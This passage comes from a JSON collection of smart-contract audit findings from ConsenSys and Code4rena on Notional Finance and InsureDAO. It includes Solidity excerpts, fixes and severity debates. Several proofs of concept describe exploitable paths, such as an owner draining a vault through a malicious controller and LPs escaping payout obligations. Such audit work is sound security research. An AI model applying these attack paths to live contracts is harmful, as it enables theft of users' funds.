zero, there will be an unhandled division by zero during liquidation:\n\n\n**contracts-v2/contracts/external/actions/VaultAccountAction.sol:L274-L281**\n\n\n\n```\nuint256 vaultSharesToLiquidator;\n{\n    vaultSharesToLiquidator = vaultAccount.tempCashBalance.toUint()\n        .mul(vaultConfig.liquidationRate.toUint())\n        .mul(vaultAccount.vaultShares)\n        .div(vaultShareValue.toUint())\n        .div(uint256(Constants.RATE\\_PRECISION));\n}\n\n```\nIf a vault account’s secondary debt is being repaid when there is none, there will be an unhandled division by zero:\n\n\n**contracts-v2/contracts/internal/vaults/VaultConfiguration.sol:L661-L666**\n\n\n\n```\nVaultSecondaryBorrowStorage storage balance =\n    LibStorage.getVaultSecondaryBorrow()[vaultConfig.vault][maturity][currencyId];\nuint256 totalfCashBorrowed = balance.totalfCashBorrowed;\nuint256 totalAccountDebtShares = balance.totalAccountDebtShares;\n\nfCashToLend = debtSharesToRepay.mul(totalfCashBorrowed).div(totalAccountDebtShares).toInt();\n\n```\nWhile these cases may be unlikely today, this code could be reutilized in other circumstances later that could cause reverts and even disrupt operations more frequently.\n\n\n#### Recommendation\n\n\nHandle the cases where the denominator could be zero appropriately.",
      "summary": "\nThe Notional team identified three places in their contract code where division by zero could occur, potentially leading to reverts and disrupting operations. The team remediated the issue by adding checks to account for division by zero in the settle vault account, as well as a short circuit to ensure debtSharesToRepay is never zero. The team also acknowledged that the contract will revert when vaultShareValue is zero, but decided to not make any changes related to that.\n\nIt is important to handle cases where the denominator could be zero appropriately, as this code could be reutilized in other circumstances later that could cause reverts and even disrupt operations more frequently.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Notional Finance",
      "source_link": "https://consensys.net/diligence/audits/2022/07/notional-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "George Kobakhidze",
        " Chingiz Mardanov",
        " Sergii Kravchenko\n"
      ]
    },
    {
      "id": "13244",
      "title": "VaultConfig.setVaultConfig doesn’t check all critical arguments",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nRemediated per Notional’s team notes in [commit](https://github.com/notional-finance/contracts-v2/pull/104/commits/e45cfa91a200f53840615f530968856887667490) by adding the following checks:\n\n\n* Checks to ensure borrow currency and secondary currencies cannot change once set\n* Check to ensure `liquidationRate` does not exceed `minCollateralRatioBPS`\n\n\nCheck for `maxBorrowMarketIndex` was not added. The Notional team will review this parameter on a case-by-case basis as for some vaults borrowing idiosyncratic fCash may not be an issue\n\n\n\n\n#### Description\n\n\nThe Notional Strategy Vaults need to get whitelisted and have specific Notional parameters set in order to interact with the rest of the Notional system. This is done through `VaultAction.updateVault()` where the `owner` address can provide a `VaultConfigStorage calldata vaultConfig` argument to either whitelist a new vault or change an existing one. While this is to be performed by a trusted privileged actor (the `owner`), and it could be assumed they are careful with their updates, the contracts themselves don’t perform enough checks on the validity of the parameters, either in isolation or when compared against the existing vault state. Below are examples of arguments that should be better checked.\n\n\n#### `borrowCurrencyId`\n\n\nThe `borrowCurrencyId` parameter gets provided to `TokenHandler.getAssetToken()` and `TokenHandler.getUnderlyingToken()` to retrieve its associated `TokenStorage` object and verify that the currency doesn’t have transfer fees.\n\n\n**contracts-v2/contracts/internal/vaults/VaultConfiguration.sol:L162-L164**\n\n\n\n```\nToken memory assetToken = TokenHandler.getAssetToken(vaultConfig.borrowCurrencyId);\nToken memory underlyingToken = TokenHandler.getUnderlyingToken(vaultConfig.borrowCurrencyId);\nrequire(!assetToken.hasTransferFee && !underlyingToken.hasTransferFee);\n\n```\nHowever, these calls retrieve data from the mapping from storage which returns an empty struct for an unassigned currency ID. This would pass the check in the last require statement regarding the transfer fees and would successfully allow to set the currency even if isn’t actually registered in Notional. The recommendation would be to check that the returned `TokenStorage` object has data inside of it, perhaps by checking the decimals on the token.\n\n\nIn the event that this is a call to update the configuration on a vault instead of whitelisting a whole new vault, this would also allow to switch the borrow currency without checking that the existing borrow and lending accounting has been cleared. This could cause accounting issues. A check for existing debt before swapping the borrow currency IDs is recommended.\n\n\n#### `liquidationRate` and `minCollateralRatioBPS`\n\n\nTo ensure that the system doesn’t have bad debt, it employs a liquidation engine that depends on a few parameters, in particular the vault’s `liquidationRate` that incentivises liquidators and `minCollateralRatioBPS` that determines when an account can be liquidated.`minCollateralRationBPS+100%` (since the collateral ratio is calculated starting from `0%` not `100%`) would need to be greater than `liquidationRate` (that is calculated from `100%`) or the system could run into problems liquidating small accounts entering the vault.\nThere is an edge case during liquidation where if the account is below the minimum collateral ratio but doesn’t have to be liquidated fully, the leftover position from that account would be too small for liquidators to profitably liquidate (due to gas costs) as per another configuration parameter `minAccountBorrowSize`. In this edge case, the system would set the whole account to be liquidated and determine that the liquidator deposit required would be equal to that account’s total debt, which would be normally seen as `vaultAccount.fCash`. The liquidator in this case would roughly receive as much value as `vaultAccount.fCash*liquidationRate` denominated in that vault account’s `vaultAccount.vaultShares`, which is the existing assets of that vault account. In fact the liquidator gets:\n\n\n**contracts-v2/contracts/external/actions/VaultAccountAction.sol:L274-L283**\n\n\n\n```\nuint256 vaultSharesToLiquidator;\n{\n    vaultSharesToLiquidator = vaultAccount.tempCashBalance.toUint()\n        .mul(vaultConfig.liquidationRate.toUint())\n        .mul(vaultAccount.vaultShares)\n        .div(vaultShareValue.toUint())\n        .div(uint256(Constants.RATE\\_PRECISION));\n}\n\nvaultAccount.vaultShares = vaultAccount.vaultShares.sub(vaultSharesToLiquidator);\n\n```\nWhere `vaultAccount.tempCashBalance` has the liquidator deposit, which in this case would be the account’s debt and equal to `vaultAccount.fCash`. However, since we know that this account is being liquidated, we know that `fCash*(1+minCollateralRationBPS) >= vaultShareValue`. Similarly, assuming the liquidation rate was set incorrectly as defined in the beginning of this section, i.e. `liquidationRate > (1+minCollateralRationBPS)`, we can determine that `fCash*(liquidationRate) > vaultShareValue` as well. Therefore, we will get some number `vaultSharesToLiquidator=X*vaultAccount.vaultShares`, where `X=(vaultAccount.tempCashBalance*vaultConfig.liquidationRate)/(vaultShareValue)` and `X>1`, so the result will be `vaultSharesToLiquidator>vaultAccount.vaultShares`, which will cause a revert once the liquidator shares get subtracted from that vault account’s vault share balance. This will cause the account to remain in the system until the account is possibly insolvent , potentially causing bad debt.\nThe recommendation would be to check that the liquidation rate is less than the minimum collateral ratio, of course in the appropriate denomination (i.e. do `minCollateral+1`) and precision.\n\n\n#### `maxBorrowMarketIndex`\n\n\nThe current Strategy Vault implementation does not allow for idiosyncratic cash because it causes issues during exits as there are no active markets for the account’s maturity. Therefore, the configuration shouldn’t be set with `maxBorrowMarketIndex >=3` as that would open up the 1 Year maturity for vault accounts that could cause idiosyncratic fCash. The recommendation would be to add that check.\n\n\n#### `secondaryBorrowCurrencies`\n\n\nSimilarly to the `borrowCurrencyId`, there are few checks that actually determine that the `secondaryBorrowCurrencies[]` given are actually registered in Notional. This is, however, more inline with how some vaults are supposed to work as they may have no secondary currencies at all, such as when the `secondaryBorrowCurrencies[]` id is given as `0`.\nIn the event that this is a call to update the configuration on a vault instead of whitelisting a whole new vault, this would also allow to switch the secondary borrow currency without checking that the existing borrow and lending accounting has been cleared. For example, the `VaultAction.updateSecondaryBorrowCapacity()` function could be invoked on the new set of secondary currencies and simply increase the borrow there. This could cause accounting issues. A check for existing debt before swapping the borrow currency IDs is recommended.",
      "summary": "\nThe Notional Strategy Vaults need to be whitelisted and have specific Notional parameters set in order to interact with the rest of the Notional system. This is done through `VaultAction.updateVault()` where the `owner` address can provide a `VaultConfigStorage calldata vaultConfig` argument to either whitelist a new vault or change an existing one. The contracts do not perform enough checks on the validity of the parameters, either in isolation or when compared against the existing vault state. To ensure that the system doesn’t have bad debt, it employs a liquidation engine that depends on a few parameters, in particular the vault’s `liquidationRate` that incentivises liquidators and `minCollateralRatioBPS` that determines when an account can be liquidated. The current Strategy Vault implementation does not allow for idiosyncratic cash because it causes issues during exits as there are no active markets for the account’s maturity. \n\nRemediation has been done per Notional’s team notes in [commit](https://github.com/notional-finance/contracts-v2/pull/104/commits/e45cfa91a200f53840615f530968856887667490) by adding the following checks: Checks to ensure borrow currency and secondary currencies cannot change once set, and a check to ensure `liquidationRate` does not exceed `minCollateralRatioBPS`. However, a check for `maxBorrowMarketIndex` was not added. The Notional team will review this parameter on a case-by-case basis as for some vaults borrowing idiosyncratic fCash may not be an issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Notional Finance",
      "source_link": "https://consensys.net/diligence/audits/2022/07/notional-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "George Kobakhidze",
        " Chingiz Mardanov",
        " Sergii Kravchenko\n"
      ]
    },
    {
      "id": "42440",
      "title": "[M-07] `requestWithdraw` without obligation to withdraw allow underwriter to avoid payout",
      "impact": "MEDIUM",
      "content": "_Submitted by gzeon_\n\nTo prevent withdrawal front-running, a lockup period is set between withdrawal request and withdrawal. However, there are no obligation to withdraw after the lockup period and the capital will keep earning premium during lockup. A strategy for underwriter is to keep requesting withdrawal every `lockup period` to keep their average lockup to `lockup period/2`.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L279>\n\nAssuming\n\n1.  Reporting DAO vote last for 24 hours (according to docs) plus there will be delay between the hack and vote creation\n2.  the `lockup period` is set to 86400 (24 hours) in the supplied test cases\n\nIt is very likely an underwriter can avoid payout by such strategy since their effective lockup would be 12 hours only. They will continue to earn yield in the pool and only require some extra gas cost for the `requestWithdraw` every 24 hours.\n\n#### Recommended Mitigation Steps\n\nExtend the lockup period at least by a factor of 2 or force underwriter to withdraw after lockup period.\n\n\n**[oishun1112 (Insure) acknowledged](https://github.com/code-423n4/2022-01-insure-findings/issues/295):**\n > Yes, lock up period is going to be like a week~2week in production.\n\n\n",
      "summary": "\nThis bug report is about a problem with the withdrawal process in the Insure contract. The contract has a lockup period between withdrawal requests and actual withdrawals, but there is no obligation for users to actually withdraw their funds after the lockup period. This allows underwriters to continuously request withdrawals every lockup period, keeping their average lockup time at half the set lockup period. This means they can continue to earn interest on their funds while only having to pay the extra gas cost for the withdrawal request. To fix this issue, it is recommended to either extend the lockup period or force underwriters to withdraw after the lockup period. The team has acknowledged the issue and plans to have a longer lockup period in the production version of the contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/295",
      "tags": [],
      "finders": []
    },
    {
      "id": "42439",
      "title": "[M-05] `Vault.sol` Tokens with fee on transfer are not supported",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by pmerkleplant, cmichel, Ruhum, and Dravee_\n\nThere are ERC20 tokens that charge fee for every `transfer()` / `transferFrom()`.\n\n`Vault.sol#addValue()` assumes that the received amount is the same as the transfer amount, and uses it to calculate attributions, balance amounts, etc. While the actual transferred amount can be lower for those tokens.\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L124-L140>\n\n```solidity\nfunction addValue(\n    uint256 _amount,\n    address _from,\n    address _beneficiary\n) external override onlyMarket returns (uint256 _attributions) {\n\n    if (totalAttributions == 0) {\n        _attributions = _amount;\n    } else {\n        uint256 _pool = valueAll();\n        _attributions = (_amount * totalAttributions) / _pool;\n    }\n    IERC20(token).safeTransferFrom(_from, address(this), _amount);\n    balance += _amount;\n    totalAttributions += _attributions;\n    attributions[_beneficiary] += _attributions;\n}\n```\n\n#### Recommendation\n\nConsider comparing before and after balance to get the actual transferred amount.\n\n**[oishun1112 (Insure) acknowledged](https://github.com/code-423n4/2022-01-insure-findings/issues/236):**\n > only USDC can be underwriting asset. We are trying to make it multi currency. \n> We won't implement this now due to the gas consumption, but we will when we develop new type of Vault\n\n\n",
      "summary": "\nThe report discusses a bug found in a project's code by multiple users. The bug involves ERC20 tokens that charge a fee for every transfer. The code assumes that the received amount is the same as the transfer amount, but for these tokens, the actual transferred amount can be lower. This can cause issues with calculating attributions and balance amounts. The recommendation is to compare the before and after balance to get the actual transferred amount. The project has acknowledged the bug and plans to address it in the future.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/236",
      "tags": [],
      "finders": []
    },
    {
      "id": "42438",
      "title": "[M-02] Owner can call `applyCover` multiple times in `PoolTemplate.sol`",
      "impact": "MEDIUM",
      "content": "_Submitted by camden_\n\nThe owner could potentially extend the insurance period indefinitely in the `applyCover` function without ever allowing the market to resume. This is because there is no check in `applyCover` to ensure that the market is in a `Trading` state.\n\nThis can also allow the owner to emit fraudulent `MarketStatusChanged` events.\n\n#### Recommended Mitigation Steps\n\nRequire that the market be in a `Trading` state to allow another `applyCover` call.\n\n**[oishun1112 (Insure) confirmed and resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/160):**\n > this behaviour is not intended, so confirmed.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/160#issuecomment-1023710961):**\n > upgrading to medium severity since it alters the function of the protocol \n> \n> `\n> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n",
      "summary": "\nSummary:\n\nA bug was reported by a user named camden regarding the `applyCover` function in the Insure protocol. The bug allows the owner to extend the insurance period indefinitely without allowing the market to resume trading. It also allows the owner to emit fraudulent `MarketStatusChanged` events. The recommended mitigation steps include requiring the market to be in a `Trading` state before allowing another `applyCover` call. The bug has been confirmed and resolved by a user named oishun1112, and another user named 0xean has commented that it should be considered a medium severity bug as it could impact the function of the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/160",
      "tags": [],
      "finders": []
    },
    {
      "id": "42437",
      "title": "[H-13] Admin of the index pool can `withdrawCredit()` after `applyCover()` to avoid taking loss for the compensation paid for a certain pool",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nIn the current implementation, when an incident is reported for a certain pool, the index pool can still `withdrawCredit()` from the pool, which in the best interest of an index pool, the admin of the index pool is preferred to do so.\n\nThis allows the index pool to escape from the responsibility for the risks of invested pools.\n\nMaking the LPs of the pool take an unfair share of the responsibility.\n\n##### Proof of Concept\n\n*   Pool A `totalCredit` = 10,000\n*   Pool A `rewardPerCredit` = 1\n\n1.  \\[Index Pool 1] allocates 1,000 credits to Pool `A`:\n\n*   `totalCredit` = 11,000\n*   indicies\\[Index Pool 1] = 1,000\n\n2.  After a while, Pool A `rewardPerCredit` has grown to `1.1`, and `applyCover()` has been called, \\[Index Pool 1] call `withdrawCredit()` get 100 premium\n\n*   `totalCredit` = 10,000\n*   indicies\\[Index Pool 1] = 0\n\n3.  After `pendingEnd`, the pool `resume()`,\\[ Index Pool 1] will not be paying for the compensation since `credit` is 0.\n\nIn our case, \\[Index Pool 1] earned premium without paying for a part of the compensation.\n\n#### Recommendation\n\nChange to:\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L416-L421>\n\n```solidity\nfunction withdrawCredit(uint256 _credit)\n    external\n    override\n    returns (uint256 _pending)\n{\n    require(\n        marketStatus == MarketStatus.Trading,\n        \"ERROR: WITHDRAW_CREDIT_BAD_CONDITIONS\"\n    );\n    IndexInfo storage _index = indicies[msg.sender];\n```\n\n**[oishun1112 (Insure) confirmed and disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/281):**\n > to call PoolTemplate: withdrawCredit(), someone has to call IndexTemplate: withdraw(), set(), and adjustAlloc().\n> \n> set() is onlyOwner, so we assume it's fine()\n> adjustAlloc() is public. this clean up and flatten the credit distribution.\n> withdraw() is public. this reduce totalCredit to distribute. when exceed upperSlack, call adjustAlloc().\n> \n > We should lock the credit control when pool is in payout status.\n> This implementation, still allows small amount of withdraw, for users who were requested Withdraw.\n\n**[oishun1112 (Insure) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/281#issuecomment-1027721179):**\n > We have fixed with PVE02 (Peckshield audit) issue together.\n\n \n",
      "summary": "\nThe bug report discusses a problem with the current implementation of a system where an incident is reported for a certain pool. It is possible for the index pool to withdraw credit from the pool, which is not fair for the investors of the pool. This allows the index pool to avoid taking responsibility for any risks and puts an unfair burden on the investors. The report provides a proof of concept, recommendation, and comments from the developers. The issue has been fixed in collaboration with a third-party audit. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/281",
      "tags": [],
      "finders": []
    },
    {
      "id": "42436",
      "title": "[H-12] `IndexTemplate.sol` Wrong implementation allows lp of the index pool to resume a locked `PayingOut` pool and escape the responsibility for the compensation",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug, also found by leastwood_\n\nBased on the context, the system intends to lock all the lps during PayingOut period.\n\nHowever, the current implementation allows anyone, including LPs to call `resume()` and unlock the index pool.\n\nIt allows a malicious LP to escape the responsibility for the compensation, at the expense of other LPs paying more than expected.\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L459-L471>\n\n```solidity\nfunction resume() external override {\n    uint256 _poolLength = poolList.length;\n\n    for (uint256 i = 0; i < _poolLength; i++) {\n        require(\n            IPoolTemplate(poolList[i]).paused() == false,\n            \"ERROR: POOL_IS_PAUSED\"\n        );\n    }\n\n    locked = false;\n    emit Resumed();\n}\n```\n\n#### Recommendation\n\nChange to:\n\n```solidity\nfunction resume() external override {\n   uint256 _poolLength = poolList.length;\n\n   for (uint256 i = 0; i < _poolLength; i++) {\n       require(\n           IPoolTemplate(poolList[i]).marketStatus() == MarketStatus.Trading,\n           \"ERROR: POOL_IS_PAYINGOUT\"\n       );\n   }\n\n   locked = false;\n   emit Resumed();\n}\n```\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/278)**\n\n",
      "summary": "\nThe system in question aims to lock all the lps during a specific period called PayingOut. However, there is a bug that allows anyone, including LPs, to call `resume()` and unlock the index pool. This means that a malicious LP can avoid their responsibility for compensation, causing other LPs to pay more than expected. The recommended solution is to change the code so that it checks for a different status before unlocking the pool. This bug has been confirmed by a member of the Insure team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/278",
      "tags": [],
      "finders": []
    },
    {
      "id": "42435",
      "title": "[H-11] `PoolTemplate.sol#resume()` Wrong implementation of `resume()` will compensate overmuch redeem amount from index pools",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug, also found by danb_\n\nWrong arithmetic.\n\n***\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L700-L717>\n\n```solidity\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /\n            totalLiquidity();\n    uint256 _actualDeduction;\n    for (uint256 i = 0; i < indexList.length; i++) {\n        address _index = indexList[i];\n        uint256 _credit = indicies[_index].credit;\n        if (_credit > 0) {\n            uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n                _totalCredit;\n            uint256 _redeemAmount = _divCeil(\n                _deductionFromIndex,\n                _shareOfIndex\n            );\n            _actualDeduction += IIndexTemplate(_index).compensate(\n                _redeemAmount\n            );\n        }\n    }\n```\n\n#### Proof of Concept\n\n*   totalLiquidity = 200,000\\* 10\\*\\*18;\n\n*   totalCredit = 100,000 \\* 10\\*\\*18;\n\n*   debt = 10,000 \\* 10\\*\\*18;\n\n*   \\[Index Pool 1] Credit = 20,000 \\* 10\\*\\*18;\n\n*   \\[Index Pool 2] Credit = 30,000 \\* 10\\*\\*18;\n\n```\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /\n            totalLiquidity();\n// _deductionFromIndex = 10,000 * 10**6 * 10**18;\n\n```\n\n\\[Index Pool 1]:\n```solidity\n\nuint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;  \n//  _shareOfIndex = 200000\n\nuint256 _redeemAmount = _divCeil(\n    _deductionFromIndex,\n    _shareOfIndex\n);\n\n// _redeemAmount = 25,000 * 10**18;\n```\n\\[Index Pool 2]:\n```solidity\nuint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;  \n//  _shareOfIndex = 300000\n\nuint256 _redeemAmount = _divCeil(\n    _deductionFromIndex,\n    _shareOfIndex\n);\n\n// _redeemAmount = 16666666666666666666667 (~ 16,666 * 10**18)\n```\nIn most cases, the transaction will revet on underflow at:\n```solidity\nuint256 _shortage = _deductionFromIndex /\n    MAGIC_SCALE_1E6 -\n    _actualDeduction;\n```\nIn some cases, specific pools will be liable for unfair compensation:\n\nIf the CSD is empty, `Index Pool 1` only have `6,000 * 10**18` and `Index Pool 2` only have `4,000 * 10**18`, the `_actualDeduction` will be `10,000 * 10**18`, `_deductionFromPool` will be `0`.\n\n`Index Pool 1` should only pay `1,000 * 10**18`, but actually paid `6,000 * 10**18`, the LPs of `Index Pool 1` now suffer funds loss.\n\n#### Recommendation\n\nChange to:\n\n```solidity\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) / totalLiquidity();\nuint256 _actualDeduction;\nfor (uint256 i = 0; i < indexList.length; i++) {\n    address _index = indexList[i];\n    uint256 _credit = indicies[_index].credit;\n    if (_credit > 0) {\n        uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n            _totalCredit;\n        uint256 _redeemAmount = _divCeil(\n            _deductionFromIndex * _shareOfIndex,\n            MAGIC_SCALE_1E6 * MAGIC_SCALE_1E6\n        );\n        _actualDeduction += IIndexTemplate(_index).compensate(\n            _redeemAmount\n        );\n    }\n}\n```\n\n**[oishun1112 (Insure) confirmed and resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/283)**\n\n\n",
      "summary": "\nThe bug report is about a wrong calculation in the code of a contract called PoolTemplate.sol. This code is used for a project called Insure and is available on GitHub. The bug was discovered by two users, WatchPug and danb. \n\nThe wrong calculation occurs in a part of the code that deals with arithmetic operations. This part of the code has a loop that goes through a list of addresses and performs calculations based on the values associated with those addresses. However, the calculations are not correct, which can lead to errors in the code. \n\nTo demonstrate the bug, the users provided a proof of concept with specific values for the variables used in the code. The values used in the proof of concept are not realistic and are only meant to show the bug. \n\nThe users also provided a recommendation to fix the bug. The recommendation involves changing a specific part of the code to ensure that the calculations are correct. \n\nAfter the bug report was submitted, the team behind Insure confirmed the bug and resolved it by following the recommendation provided by the users. This means that the bug is no longer present in the code and the project is now functioning as intended. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/283",
      "tags": [],
      "finders": []
    },
    {
      "id": "42434",
      "title": "[H-09] `Vault#setController()` owner of the Vault contracts can drain funds from the Vault",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L485-L496>\n\n```solidity\nfunction setController(address _controller) public override onlyOwner {\n    require(_controller != address(0), \"ERROR_ZERO_ADDRESS\");\n\n    if (address(controller) != address(0)) {\n        controller.migrate(address(_controller));\n        controller = IController(_controller);\n    } else {\n        controller = IController(_controller);\n    }\n\n    emit ControllerSet(_controller);\n}\n```\n\nThe owner of the Vault contract can set an arbitrary address as the `controller`.\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L342-L352>\n\n```solidity\nfunction utilize() external override returns (uint256 _amount) {\n    if (keeper != address(0)) {\n        require(msg.sender == keeper, \"ERROR_NOT_KEEPER\");\n    }\n    _amount = available(); //balance\n    if (_amount > 0) {\n        IERC20(token).safeTransfer(address(controller), _amount);\n        balance -= _amount;\n        controller.earn(address(token), _amount);\n    }\n}\n```\n\nA malicious `controller` contract can transfer funds from the Vault to the attacker.\n\n#### Proof of Concept\n\nA malicious/compromised can:\n\n1.  Call `Vault#setController()` and set `controller` to a malicious contract;\n    *   L489 the old controller will transfer funds to the new, malicious controller.\n2.  Call `Vault#utilize()` to deposit all the balance in the Vault contract into the malicious controller contract.\n3.  Withdraw all the funds from the malicious controller contract.\n\n#### Recommendation\n\nConsider disallowing `Vault#setController()` to set a new address if a controller is existing, which terminates the possibility of migrating funds to a specified address provided by the owner. Or, putting a timelock to this function at least.\n\n\n**[oishun1112 (Insure) acknowledged and disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/271):**\n > we assume ownership control is driven safely\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/271#issuecomment-1023326594):**\n > Agree with warden that the privilege addresses should not be able to use approvals in a way that rugs users funds.\n> \n> Based on the fact that we have seen many rug pulls in the space based on compromised \"owner\" keys, this is a valid attack path.\n> `\n> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the Vault contract of the Insure project. The owner of the contract has the ability to set an arbitrary address as the \"controller\", which can then be used to transfer funds from the Vault to the attacker. This can be done by calling the `setController()` function to set the controller to a malicious contract, and then using the `utilize()` function to deposit all the balance in the Vault to the malicious contract. The attacker can then withdraw the funds from the malicious contract. The report recommends disallowing the `setController()` function if a controller is already set, or implementing a timelock for this function. The severity of this vulnerability was disagreed upon by the Insure team, but the judge agreed that it is a valid attack path and could result in the loss of user funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/271",
      "tags": [],
      "finders": []
    },
    {
      "id": "42433",
      "title": "[H-08] `IndexTemplate.sol#compensate()` will most certainly fail",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nPrecision loss while converting between `the amount of shares` and `the amount of underlying tokens` back and forth is not handled properly.\n\n***\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L438-L447>\n\n```solidity\nuint256 _shortage;\nif (totalLiquidity() < _amount) {\n    //Insolvency case\n    _shortage = _amount - _value;\n    uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))\n        .compensate(_shortage);\n    _compensated = _value + _cds;\n}\nvault.offsetDebt(_compensated, msg.sender);\n```\n\nIn the current implementation, when someone tries to resume the market after a pending period ends by calling `PoolTemplate.sol#resume()`, `IndexTemplate.sol#compensate()` will be called internally to make a payout. If the index pool is unable to cover the compensation, the CDS pool will then be used to cover the shortage.\n\nHowever, while `CDSTemplate.sol#compensate()` takes a parameter for the amount of underlying tokens, it uses `vault.transferValue()` to transfer corresponding `_attributions` (shares) instead of underlying tokens.\n\nDue to precision loss, the `_attributions` transferred in the terms of underlying tokens will most certainly be less than the shortage.\n\nAt L444, the contract believes that it's been compensated for `_value + _cds`, which is lower than the actual value, due to precision loss.\n\nAt L446, when it calls `vault.offsetDebt(_compensated, msg.sender)`, the tx will revert at `require(underlyingValue(msg.sender) >= _amount)`.\n\nAs a result, `resume()` can not be done, and the debt can't be repaid.\n\n##### Proof of Concept\n\nGiven:\n\n*   vault.underlyingValue = 10,000\n*   vault.valueAll = 30,000\n*   totalAttributions = 2,000,000\n*   \\_amount = 1,010,000\n\n0.  \\_shortage = \\_amount - vault.underlyingValue = 1,000,000\n1.  \\_attributions = (\\_amount \\* totalAttributions) / valueAll = 67,333,333\n2.  actualValueTransfered = (valueAll \\* \\_attributions) / totalAttributions = 1009999\n\n**Expected results**: actualValueTransfered = \\_shortage;\n\n**Actual results**: actualValueTransfered < \\_shortage.\n\n#### Impact\n\nThe precision loss isn't just happening on special numbers, but will most certainly always revert the txs.\n\nThis will malfunction the contract as the index pool can not `compensate()`, therefore the pool can not `resume()`. Causing the funds of the LPs of the pool and the index pool to be frozen, and other stakeholders of the same vault will suffer fund loss from an unfair share of the funds compensated before.\n\n#### Recommendation\n\nChange to:\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L439-L446>\n\n```solidity\nif (totalLiquidity() < _amount) {\n    //Insolvency case\n    _shortage = _amount - _value;\n    uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))\n        .compensate(_shortage);\n    _compensated = vault.underlyingValue(address(this));\n}\nvault.offsetDebt(_compensated, msg.sender);\n```\n\n**[oishun1112 (Insure) confirmed and disagreed with 